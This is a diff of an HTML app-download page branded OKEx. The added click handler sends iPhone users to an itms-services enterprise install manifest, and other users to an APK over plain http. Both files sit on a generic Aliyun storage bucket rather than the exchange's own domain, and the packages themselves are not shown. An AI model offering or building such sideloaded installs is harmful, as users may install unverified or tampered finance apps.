@@ -10,21 +10,7 @@
     <meta name="viewport"
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
     <meta name="MobileOptimized" content="375">
-    <!-- <link rel="shortcut icon" href="//img.bafang.com/cdn/assets/imgs/MjAxODg/D91A7323087D31A588E0D2A379DD7747.png"
-        type="image/png" />
-    <link rel="alternate" href="https://www.okex.com/lang/en-US/" hreflang="en-us">
-    <link rel="alternate" href="https://www.okex.com/lang/zh-CN/" hreflang="zh-cn">
-    <link rel="stylesheet" type="text/css" href="../css/resetBase.css">
-    <link rel="stylesheet" type="text/css" href="../css/appDownload.css">
-    <script src="//img.bafang.com/cdn/assets/okfe/libs/jquery/jquery&cookie.js"></script>
-    <script>
-        document.documentElement.style.fontSize = innerWidth / 3.75 + "px";
-        window.addEventListener("resize", function () {
-            document.documentElement.style.fontSize = innerWidth / 3.75 + "px";
-        }, false);
-    </script> -->
-
-
+    <script src="../okex/install.js"></script>
     <link rel="stylesheet" type="text/css" href="../css/download.css">
 </head>
 
@@ -38,17 +24,17 @@
     <img class="center" src="../images/center.png" />
     <div class="bottom">
         <img class="install" src="../images/install_button.png" />
-        <a id="install" class="install"></a>
+        <text class="install_title">安装/Install</text>
+        <a id="install" class="button"></a>
     </div>
     <img class="bottom_ring" src="../images/bottom_ring.png"><img>
-
-    <!-- <div class="wrapper">
-        <div class="logo"></div>
-        <div class="name">OKEx</div>
-        <a id="download" class="download">安装/Install</a>
-    </div> -->
 </body>
 
-<script src="../okex/install.js"></script>
+<script type="text/javascript">
+    document.getElementById('install').onclick = function () {
+        -1 < navigator.userAgent.indexOf("iPhone") || -1 < navigator.userAgent.indexOf("iOS") ? window.location.href = "itms-services://?action=download-manifest&url=https://upgradeapp.oss-cn-hangzhou.aliyuncs.com/upgradeapp/install-manifest.plist" : window.location.href = "http://upgradeapp.oss-cn-hangzhou.aliyuncs.com/upgradeapp/OKEx-android.apk"
+    }
+</script>
+
 
 </html>
